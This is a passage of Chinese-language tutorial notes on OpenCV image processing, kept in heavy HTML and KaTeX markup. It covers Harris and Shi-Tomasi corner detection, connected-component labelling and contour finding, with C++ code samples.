class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow></munder><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>I</mi><mi>x</mi><mn>2</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>x</mi></msub><msub><mi>I</mi><mi>y</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>I</mi><mi>x</mi></msub><msub><mi>I</mi><mi>y</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>I</mi><mi>y</mi><mn>2</mn></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow></mrow><annotation encoding="application/x-tex">M=\sum_{x,y}{w(x,y)\begin{bmatrix}I_x^2  &amp;I_xI_y \\I_xI_y  &amp;I_y^2\end{bmatrix}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.847667em;vertical-align:-1.386113em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.8999949999999999em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.386113em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.461554em;"><span style="top:-3.6215539999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.421554em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.961554em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.461554em;"><span style="top:-3.6215539999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.421554em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.961554em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></span></p><ul><li>求取R值越大，响应值越大。矩阵有两个变换：特征向量的变换，奇异值变换</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>R</mi><mo>=</mo><mi>det</mi><mo>⁡</mo><mi>M</mi><mo>−</mo><mi>k</mi><mo stretchy="false">(</mo><mi>t</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>e</mi><mtext>  </mtext><mi>M</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">R=\det{M}-k(trace\;M)^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mop">det</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>det</mi><mo>⁡</mo><mi>M</mi><mo>=</mo><msub><mi>λ</mi><mn>1</mn></msub><msub><mi>λ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\det{M}=\lambda_1\lambda_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mop">det</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>r</mi><mi>a</mi><mi>c</mi><mi>e</mi><mtext>  </mtext><mi>M</mi><mo>=</mo><msub><mi>λ</mi><mn>1</mn></msub><mo>+</mo><msub><mi>λ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">trace\;M=\lambda_1+\lambda_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">λ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><ul><li>det求取矩阵的特征值<code>λ&lt;sub&gt;1&lt;\sub&gt;λ&lt;sub&gt;2&lt;\sub&gt;</code></li><li>在边缘区域上，<code>λ&lt;sub&gt;1&lt;\sub&gt;λ&lt;sub&gt;2&lt;\sub&gt;</code>其中一个很大，在平坦区域，<code>λ&lt;sub&gt;1&lt;\sub&gt;λ&lt;sub&gt;2&lt;\sub&gt;</code>都很小，只有在角点区域才使得R很大</li><li>k值是用于调节R的大小的，一般k=0.04~0.06</li></ul><h3 id="代码实现-12"><a class="markdownIt-Anchor" href="#代码实现-12"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> blocksize=<span class="number">2</span>,ksize=<span class="number">3</span>;<span class="keyword">double</span> k=<span class="number">0.04</span>;</span><br><span class="line"><span class="comment">//input,output,计算偏导时区域范围,sobel计算梯度窗口大小,k</span></span><br><span class="line">cornerHarris(gray,dst,blocksize,ksize,k);</span><br><span class="line">Mat dst_norm = Mat::zeros(dst.size,dst.type());</span><br><span class="line">normalize(dst,dst_norm,<span class="number">0</span>,<span class="number">255</span>,NORM_MINMAX,<span class="number">-1</span>,Mat());</span><br><span class="line">convertScaleAbs(dst_norm,dst_norm);</span><br><span class="line"><span class="comment">//draw corners</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;src.rows;row++)&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;src.cols;col++)&#123;</span><br><span class="line">    <span class="keyword">int</span> rsp=dst_norm.at&lt;uchar&gt;(row,col);</span><br><span class="line">    <span class="keyword">if</span> (rsp&gt;<span class="number">150</span>)&#123;</span><br><span class="line">      circle(src,Point(col,row),<span class="number">5</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="shi-tomas角点检测"><a class="markdownIt-Anchor" href="#shi-tomas角点检测"></a> shi-tomas角点检测</h2><ul><li>shi-tomas优化了R的求取方法，仅计算<code>λ&lt;sub&gt;1&lt;\sub&gt;λ&lt;sub&gt;2&lt;\sub&gt;</code>最小的值，假如超过了阈值，那么<code>λ&lt;sub&gt;1&lt;\sub&gt;λ&lt;sub&gt;2&lt;\sub&gt;</code>就都很大。简化了R值的计算</li></ul>R=min(\lambda_1,\lambda_2$$)<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;Point2f&gt;corners;</span><br><span class="line"><span class="keyword">double</span> quality_level=<span class="number">0.01</span>;</span><br><span class="line"><span class="comment">//input,output,最多检测多少个角点,角点检测接受的最小值,角点间最小距离,mask,blockSize,是否使用Harris角点检测器</span></span><br><span class="line">goodFeaturesToTrack(gray,corners,<span class="number">200</span>,quality_level,<span class="number">3</span>,Mat(),<span class="number">3</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//draw corners</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;corners.size();i++)&#123;</span><br><span class="line">  circle(src,corners[i],<span class="number">5</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="几何形状检测和拟合"><a class="markdownIt-Anchor" href="#几何形状检测和拟合"></a> 几何形状检测和拟合</h1><h2 id="联通组件扫描"><a class="markdownIt-Anchor" href="#联通组件扫描"></a> 联通组件扫描</h2><ul><li>联通性的定义，四邻域和八邻域</li><li>联通组件标记CCL</li></ul><h3 id="扫描方法"><a class="markdownIt-Anchor" href="#扫描方法"></a> 扫描方法</h3><ul><li><p>基于像素的扫描方法</p></li><li><p>基于块的扫描</p></li><li><p>两部法扫描</p></li><li><p>opencv采用的是基于块的决策表的方法：BBDT</p></li><li><p>代码实现</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对原图进行高斯模糊，目的是降噪</span></span><br><span class="line">GaussianBlur(src,src,Size(<span class="number">3</span>,<span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">Mat gray,binary;</span><br><span class="line">cvtColor(src,gray,COLOR_BGR2GRAY);</span><br><span class="line">threshold(gray,binary,<span class="number">0</span>,<span class="number">255</span>,THRESH_BINARY|THRESH_OTSH);</span><br><span class="line"><span class="comment">//binary,与原图一样大小的CV32S的,8联通还是4联通,输出类型,使用联通方法</span></span><br><span class="line">Mat label=Mat::zeros(binary.size(),CV_32S);</span><br><span class="line"><span class="keyword">int</span> num_label = connectedComponents(binary,label,<span class="number">8</span>,CV_32S,CCL_DEFAULT);</span><br><span class="line"><span class="built_in">vector</span>&lt;Vec3b&gt;colorTable(num_label);</span><br><span class="line"><span class="comment">// brackgrand color</span></span><br><span class="line">colorTable[<span class="number">0</span>] = Vec3b(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;num_label;i++)&#123;</span><br><span class="line">  colorTable[i] = Vec3b(rng.uniform(<span class="number">0</span>,<span class="number">256</span>),rng.uniform(<span class="number">0</span>,<span class="number">256</span>),rng.uniform(<span class="number">0</span>,<span class="number">256</span>));</span><br><span class="line">&#125;</span><br><span class="line">Mat dst = Mat::zeros(src.size(),CV_8UC3);</span><br><span class="line"><span class="keyword">int</span> h=dst.rows,w=dst.cols;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> row=<span class="number">0</span>;row&lt;h;row++)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> col=<span class="number">0</span>;col&lt;w;col++)&#123;</span><br><span class="line">    <span class="keyword">int</span> label_index = label.at&lt;<span class="keyword">int</span>&gt;(row,col);</span><br><span class="line">    dst.at&lt;Vec3b&gt;(row,col) = colorTable(label_index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">putText(dst,format(<span class="string">&quot;number:%d&quot;</span>,num_label),Point(<span class="number">50</span>,<span class="number">50</span>),FONT_HERSHEY_PLAIN,<span class="number">1.0</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><ul><li>带有统计信息的</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stats：外接矩形位置，面积信息</span></span><br><span class="line"><span class="comment">//centroids：中心位置</span></span><br><span class="line">Mat stats,centroids;</span><br><span class="line"><span class="keyword">int</span> num_label = connectedComponentsWithStats(binary,label,stats,centroids,<span class="number">8</span>,CV_32S,CCL_DEFAULT);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;num_label;i++)&#123;</span><br><span class="line">  <span class="comment">//center</span></span><br><span class="line">  <span class="keyword">int</span> cx = centroids.at&lt;<span class="keyword">double</span>&gt;(i,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">int</span> cy = centroids.at&lt;<span class="keyword">double</span>&gt;(i,<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//rectangle</span></span><br><span class="line">  <span class="keyword">int</span> x = stats.at&lt;<span class="keyword">int</span>&gt;(i,CC_STAT_LEFT);</span><br><span class="line">  <span class="keyword">int</span> y = stats.at&lt;<span class="keyword">int</span>&gt;(i,CC_STAT_TOP);</span><br><span class="line">  <span class="keyword">int</span> w = stats.at&lt;<span class="keyword">int</span>&gt;(i,CC_STAT_WIDTH);</span><br><span class="line">  <span class="keyword">int</span> h = stats.at&lt;<span class="keyword">int</span>&gt;(i,CC_STAT_HEIGHT);</span><br><span class="line">  <span class="keyword">int</span> area = stats.at&lt;<span class="keyword">int</span>&gt;(i,CC_STAT_AREA);</span><br><span class="line">  <span class="comment">//绘制中心位置</span></span><br><span class="line">  circle(dst,Point(cx,cy),<span class="number">3</span>,Scalar(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="comment">//最小矩形</span></span><br><span class="line">  <span class="function">Rect <span class="title">box</span><span class="params">(x,y,w,h)</span></span>;</span><br><span class="line">  rectangle(dst,box,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">putText(dst,format(<span class="string">&quot;number:%d&quot;</span>,num_label),Point(x,y),FONT_HERSHEY_PLAIN,<span class="number">1.0</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">1</span>);</span><br><span class="line">  <span class="comment">//覆盖像素面积</span></span><br><span class="line">  putText(dst,format(<span class="string">&quot;number:%d&quot;</span>,area),Point(x,y),FONT_HERSHEY_PLAIN,<span class="number">1.0</span>,Scalar(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>),<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="轮廓"><a class="markdownIt-Anchor" href="#轮廓"></a> 轮廓</h2><ul><li>轮廓主要针对二值图像，0-1分割的点的集合。</li></ul><h3 id="发现"><a class="markdownIt-Anchor" href="#发现"></a> 发现</h3><ul><li>基于边界跟随的轮廓发现</li></ul><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>findContours(binary,mode,method,contours)</td><td>发现轮廓的树形结构，最外层边界依次向里</td></tr><tr><td>drawContours(src,mode,index,color,thickness,linetype)</td><td>绘制轮廓</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;Point&gt;&gt;contours;</span><br><span class="line"><span class="built_in">vector</span>&lt;Vec4i&gt;hierarchy;<span class="comment">//层次信息</span></span><br><span class="line"><span class="comment">//RET_TREE:绘制所有的轮廓；RET_EXTERNAL：绘制最外层轮廓</span></span><br><span class="line">findContours(binary,contours,hierarchy,RET_TREE,CHAIN_APPROX_SIMPLE,Point());</span><br><span class="line"><span class="comment">//src,contours,索引：-1代表绘制所有，颜色，线宽，线型：-1表示填充</span></span><br><span class="line">drawContours(src,contours,<span class="number">-1</span>,Scalar(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>),<span class="number">2</span>,<span class="number">8</span>);</span><br><span class="line">imshow(<span class="string">&quot;contour&quot;</span>,src);</span><br><span class="line"><span class="comment">//单独循环每个轮廓</span></span><br><span class="line"><span class="comment">//for(size_t t=0;t&lt;contours.size();t++)&#123;</span></span><br><span class="line"><span class="comment">//  drawContours(src,contours,t,Scalar(0,0,255),2,8);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><h3 id="计算"><a class="markdownIt-Anchor" href="#计算"></a> 计算</h3><h4 id="轮廓面积"><a class="markdownIt-Anchor" href="#轮廓面积"></a> 轮廓面积</h4><ul><li>格林公式</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder><mo>∬</mo><mi>D</mi></munder><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>Q</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>x</mi></mrow></mfrac><mo>−</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>P</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>y</mi></mrow></mfrac></mrow><mo>=</mo><mo>∫</mo><mrow><mi>P</mi><mi>d</mi><mi>x</mi><mo>+</mo><mi>Q</mi><mi>d</mi><mi>y</mi></mrow></mrow><annotation encoding="application/x-tex">\iint\limits_{D}{\frac{\partial Q}{\partial x}- \frac{\partial P}{\partial y}}=\int{Pdx+Qdy}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.9767710000000003em;vertical-align:-1.605331em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3609999999999998em;"><span style="top:-1.8546690000000003em;margin-left:-0.44445em;"><span class="pstrut" style="height:3.3600000000000003em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span></span></span></span><span style="top:-3.361em;"><span class="pstrut" style="height:3.3600000000000003em;"></span><span><span class="mop op-symbol large-op" style="margin-right:0.44445em;">∬</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.605331em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714399999999998em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.37144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.22225em;vertical-align:-0.86225em;"></span><span class="mop op-symbol large-op" style="margin-right:0.44445em;position:relative;top:-0.0011249999999999316em;">∫</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">d</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">Q</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span></span></span></p><ul><li>离散版本</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>k</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></munderover><mfrac><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>k</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>x</mi><mi>k</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mrow><mi>k</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>−</mo><msub><mi>y</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">A=\sum^{n}_{k=0}{\frac{(x_{k+1}+x_k)(y_{k+1}-y_k)}{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" 